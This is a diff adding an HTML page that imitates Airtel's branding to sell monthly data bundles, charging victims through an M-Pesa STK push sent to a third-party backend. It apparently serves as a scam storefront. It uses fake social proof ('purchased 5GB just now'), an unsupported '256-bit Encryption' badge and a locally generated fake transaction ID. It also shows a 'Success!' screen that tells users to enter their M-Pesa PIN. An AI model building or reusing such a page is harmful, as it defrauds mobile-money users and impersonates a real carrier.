@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel | Airtel Monthly Data Plans</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        // Simple test function
+        function testClick() {
+            alert('Test function works!');
+            console.log('Test function called');
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                <h1>Airtel</h1>
+                <p>Airtel Monthly Data Plans</p>
+            </div>
+            <div class="testimonial">
+                <div class="testimonial-item">
+                    <span class="phone">0719****77</span>
+                    <span class="action">purchased 5GB</span>
+                    <span class="time">• just now</span>
+                </div>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <!-- Plan Selection Section -->
+            <section class="section" id="plans-section">
+                <h2>Select Your Data Plan</h2>
+                <div class="plans-grid">
+                    <div class="plan-card" data-plan="6GB" data-price="300">
+                        <div class="plan-header">
+                            <h3>6GB</h3>
+                            <span class="plan-duration">30 Days</span>
+                        </div>
+                        <div class="plan-price">
+                            <span class="currency">Ksh</span>
+                            <span class="amount">300</span>
+                        </div>
+                        <ul class="plan-features">
+                            <li>✓ 6GB Monthly Data</li>
+                            <li>✓ 30 Days Validity</li>
+                            <li>✓ No Expiry</li>
+                            <li>✓ Bonus 200MB</li>
+                        </ul>
+                        <button class="select-plan-btn">Select Plan</button>
+                    </div>
+
+                    <div class="plan-card popular" data-plan="10GB" data-price="500">
+                        <div class="popular-badge">Most Popular</div>
+                        <div class="plan-header">
+                            <h3>10GB</h3>
+                            <span class="plan-duration">30 Days</span>
+                        </div>
+                        <div class="plan-price">
+                            <span class="currency">Ksh</span>
+                            <span class="amount">500</span>
+                        </div>
+                        <ul class="plan-features">
+                            <li>✓ 10GB Monthly Data</li>
+                            <li>✓ 30 Days Validity</li>
+                            <li>✓ No Expiry</li>
+                            <li>✓ Bonus 500MB</li>
+                        </ul>
+                        <button class="select-plan-btn">Select Plan</button>
+                    </div>
+
+                    <div class="plan-card" data-plan="20GB" data-price="800">
+                        <div class="plan-header">
+                            <h3>20GB</h3>
+                            <span class="plan-duration">30 Days</span>
+                        </div>
+                        <div class="plan-price">
+                            <span class="currency">Ksh</span>
+                            <span class="amount">800</span>
+                        </div>
+                        <ul class="plan-features">
+                            <li>✓ 20GB Monthly Data</li>
+                            <li>✓ 30 Days Validity</li>
+                            <li>✓ No Expiry</li>
+                            <li>✓ Bonus 1GB</li>
+                        </ul>
+                        <button class="select-plan-btn">Select Plan</button>
+                    </div>
+
+                    <div class="plan-card" data-plan="40GB" data-price="1500">
+                        <div class="plan-header">
+                            <h3>40GB</h3>
+                            <span class="plan-duration">30 Days</span>
+                        </div>
+                        <div class="plan-price">
+                            <span class="currency">Ksh</span>
+                            <span class="amount">1500</span>
+                        </div>
+                        <ul class="plan-features">
+                            <li>✓ 40GB Monthly Data</li>
+                            <li>✓ 30 Days Validity</li>
+                            <li>✓ No Expiry</li>
+                            <li>✓ Bonus 2GB</li>
+                        </ul>
+                        <button class="select-plan-btn">Select Plan</button>
+                    </div>
+
+                    <div class="plan-card" data-plan="60GB" data-price="2000">
+                        <div class="plan-header">
+                            <h3>60GB</h3>
+                            <span class="plan-duration">30 Days</span>
+                        </div>
+                        <div class="plan-price">
+                            <span class="currency">Ksh</span>
+                            <span class="amount">2000</span>
+                        </div>
+                        <ul class="plan-features">
+                            <li>✓ 60GB Monthly Data</li>
+                            <li>✓ 30 Days Validity</li>
+                            <li>✓ No Expiry</li>
+                            <li>✓ Bonus 3GB</li>
+                        </ul>
+                        <button class="select-plan-btn">Select Plan</button>
+                    </div>
+
+                    <div class="plan-card" data-plan="65GB" data-price="2300">
+                        <div class="plan-header">
+                            <h3>65GB</h3>
+                            <span class="plan-duration">30 Days</span>
+                        </div>
+                        <div class="plan-price">
+                            <span class="currency">Ksh</span>
+                            <span class="amount">2300</span>
+                        </div>
+                        <ul class="plan-features">
+                            <li>✓ 65GB Monthly Data</li>
+                            <li>✓ 30 Days Validity</li>
+                            <li>✓ No Expiry</li>
+                            <li>✓ Bonus 3.5GB</li>
+                        </ul>
+                        <button class="select-plan-btn">Select Plan</button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Personal Details Section -->
+            <section class="section hidden" id="numbers-section">
+                <h2>Personal Details</h2>
+                <div class="subsection">
+                    <h3>Identify Yourself</h3>
+                    <p>This information is required to verify your eligibility for the data purchase.</p>
+                    <div class="form-container">
+                        <div class="form-group">
+                            <label for="safaricom-number">Safaricom Number</label>
+                            <input type="tel" id="safaricom-number" placeholder="07XX XXX XXX" maxlength="10">
+                            <span class="input-hint">This number will be used for M-Pesa payment and contact</span>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="airtel-number">Airtel Number (Data Recipient)</label>
+                            <input type="tel" id="airtel-number" placeholder="07XX XXX XXX" maxlength="10">
+                            <span class="input-hint">Enter the Airtel number that will receive the data</span>
+                        </div>
+
+                        <div class="security-badge">
+                            <span class="secure-text">Secure 256-bit Encryption</span>
+                        </div>
+                    </div>
+                </div>
+
+                    <div class="selected-plan-info">
+                        <div class="plan-summary">
+                            <span class="plan-label">Selected Plan:</span>
+                            <span class="plan-details" id="selected-plan-details"></span>
+                        </div>
+                        <div class="total-amount">
+                            <span class="amount-label">Total Amount:</span>
+                            <span class="amount-value" id="total-amount">Ksh 0</span>
+                        </div>
+                    </div>
+
+                    <button class="proceed-btn" id="proceed-to-payment" onclick="
+    // Get user data
+    const airtelNumber = document.getElementById('airtel-number').value || document.getElementById('safaricom-number').value;
+    const safaricomNumber = document.getElementById('safaricom-number').value;
+    const selectedPlanElement = document.querySelector('.plan-card.selected');
+    const planName = selectedPlanElement ? selectedPlanElement.dataset.plan : 'No plan selected';
+    const planPrice = selectedPlanElement ? selectedPlanElement.dataset.price : '0';
+    
+    // Update confirmation page with user details
+    document.getElementById('summary-plan').textContent = planName + ' - Ksh ' + planPrice;
+    document.getElementById('summary-airtel').textContent = airtelNumber.substring(0, 4) + ' ' + airtelNumber.substring(4, 7) + ' ' + airtelNumber.substring(7);
+    document.getElementById('summary-safaricom').textContent = safaricomNumber.substring(0, 4) + ' ' + safaricomNumber.substring(4, 7) + ' ' + safaricomNumber.substring(7);
+    document.getElementById('summary-total').textContent = 'Ksh ' + planPrice;
+    
+    // Store data for payment
+    window.orderData = {
+        plan: {name: planName, price: parseInt(planPrice)},
+        airtelNumber: airtelNumber,
+        safaricomNumber: safaricomNumber
+    };
+    
+    // Switch to confirmation page
+    document.getElementById('numbers-section').classList.add('hidden');
+    document.getElementById('payment-section').classList.remove('hidden');
+">Proceed to Payment</button>
+                </div>
+            </section>
+
+            <!-- Confirmation Section -->
+            <section class="section hidden" id="payment-section">
+                <h2>Confirmation</h2>
+                <div class="subsection">
+                    <h3>Review Request</h3>
+                    <p>Please confirm your selection before we initiate the STK push.</p>
+                    <div class="order-summary">
+                        <div class="summary-item">
+                            <span class="label">Data Plan:</span>
+                            <span class="value" id="summary-plan"></span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="label">Airtel Number:</span>
+                            <span class="value" id="summary-airtel"></span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="label">Payment Number:</span>
+                            <span class="value" id="summary-safaricom"></span>
+                        </div>
+                        <div class="summary-item total">
+                            <span class="label">Total Amount:</span>
+                            <span class="value" id="summary-total"></span>
+                        </div>
+                    </div>
+
+                    <div class="payment-method">
+                        <h3>Payment Method</h3>
+                        <div class="payment-option selected">
+                            <div class="payment-icon">💳</div>
+                            <div class="payment-details">
+                                <h4>M-Pesa</h4>
+                                <p>Payment will be processed via M-Pesa STK push</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button class="confirm-btn" id="confirm-payment" onclick="
+    // Get stored order data
+    const orderData = window.orderData;
+    
+    if (!orderData || !orderData.safaricomNumber || !orderData.plan) {
+        alert('Order data not found. Please go back and select a plan.');
+        return;
+    }
+    
+    // Show processing section
+    document.getElementById('payment-section').classList.add('hidden');
+    document.getElementById('processing-section').classList.remove('hidden');
+    
+    // Call Payhero API
+    const apiUrl = window.location.hostname === 'localhost' 
+        ? 'http://localhost:3001/stk-push'
+        : 'https://your-app-name.onrender.com/stk-push';
+    
+    fetch(apiUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            phone: orderData.safaricomNumber,
+            amount: orderData.plan.price
+        })
+    })
+    .then(response => response.json())
+    .then(result => {
+        console.log('Payhero response:', result);
+        if (result.success) {
+            // Simulate payment completion
+            setTimeout(() => {
+                document.getElementById('processing-section').classList.add('hidden');
+                document.getElementById('success-section').classList.remove('hidden');
+                
+                // Update success page
+                document.getElementById('transaction-id').textContent = 'DH' + Date.now().toString().slice(-8);
+                document.getElementById('success-plan').textContent = orderData.plan.name;
+                document.getElementById('success-plan-name').textContent = orderData.plan.name;
+                document.getElementById('success-airtel').textContent = orderData.airtelNumber.substring(0, 4) + ' ' + orderData.airtelNumber.substring(4, 7) + ' ' + orderData.airtelNumber.substring(7);
+                document.getElementById('success-amount').textContent = 'Ksh ' + orderData.plan.price;
+            }, 3000);
+        } else {
+            alert('Payment failed: ' + result.message);
+            // Go back to confirmation
+            document.getElementById('processing-section').classList.add('hidden');
+            document.getElementById('payment-section').classList.remove('hidden');
+        }
+    })
+    .catch(error => {
+        console.error('Payment error:', error);
+        alert('Payment error. Please try again.');
+        // Go back to confirmation
+        document.getElementById('processing-section').classList.add('hidden');
+        document.getElementById('payment-section').classList.remove('hidden');
+    });
+">Confirm & Pay</button>
+                </div>
+            </section>
+
+            <!-- Processing Section -->
+            <section class="section hidden" id="processing-section">
+                <div class="processing-content">
+                    <div class="spinner"></div>
+                    <h2>Processing Your Order</h2>
+                    <p>Please wait while we process your payment and activate your data plan...</p>
+                    <div class="steps">
+                        <div class="step completed" id="step1">
+                            <span class="step-number">1</span>
+                            <span class="step-text">Order Received</span>
+                        </div>
+                        <div class="step" id="step2">
+                            <span class="step-number">2</span>
+                            <span class="step-text">Payment Processing</span>
+                        </div>
+                        <div class="step" id="step3">
+                            <span class="step-number">3</span>
+                            <span class="step-text">Data Activation</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Success Section -->
+            <section class="section hidden" id="success-section">
+                <div class="success-content">
+                    <h2>Success!</h2>
+                    <p>Your purchase of <span id="success-plan-name"></span> has been successfully processed.</p>
+                    <p>Final Step: Enter your M-Pesa PIN on the prompt currently showing on your phone to activate your data plan.</p>
+                    <p class="waiting-text">Please wait...</p>
+                    
+                    <div class="order-details">
+                        <div class="detail-item">
+                            <span class="label">Transaction ID:</span>
+                            <span class="value" id="transaction-id"></span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="label">Data Plan:</span>
+                            <span class="value" id="success-plan"></span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="label">Airtel Number:</span>
+                            <span class="value" id="success-airtel"></span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="label">Amount Paid:</span>
+                            <span class="value" id="success-amount"></span>
+                        </div>
+                    </div>
+                    <button class="new-order-btn" id="new-order">Place New Order</button>
+                </div>
+            </section>
+        </main>
+
+        <footer class="footer">
+            <p>&copy; 2026 Airtel. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#">Terms of Service</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Contact Support</a>
+            </div>
+        </footer>
+   </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
